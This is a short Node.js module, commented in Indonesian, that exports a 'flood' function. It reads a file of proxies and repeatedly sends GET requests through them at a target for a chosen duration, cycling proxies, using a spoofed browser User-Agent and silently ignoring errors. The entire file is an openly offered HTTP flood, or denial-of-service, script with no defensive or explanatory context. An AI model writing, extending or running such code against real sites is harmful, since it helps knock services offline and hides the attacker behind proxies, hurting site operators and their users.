const fs = require('fs');
const http = require('http');
const https = require('https');

// Fungsi untuk melakukan flood
function flood(target, duration, method, proxyFile) {
  const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n');
  let proxyIndex = 0;

  // Pilih metode request berdasarkan parameter
  const requestMethod = method === 'https' ? https : http;

  function sendRequest() {
    const proxy = proxies[proxyIndex];
    if (!proxy) return;

    const [host, port] = proxy.split(':');
    const options = {
      host,
      port: port || 80,
      path: target,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0',
        'Connection': 'keep-alive',
      }
    };

    const req = requestMethod.request(options, (res) => {
      res.on('data', () => {});
    });

    req.on('error', () => {});

    req.end();

    proxyIndex = (proxyIndex + 1) % proxies.length;
  }

  // Flood dengan mengirim request terus menerus
  const interval = setInterval(() => {
    sendRequest();
  }, 1000); // Mengirim 1 request setiap detik

  // Berhenti setelah durasi yang ditentukan
  setTimeout(() => {
    clearInterval(interval);
  }, duration * 1000);
}

// Ekspor fungsi flood
module.exports = { flood };
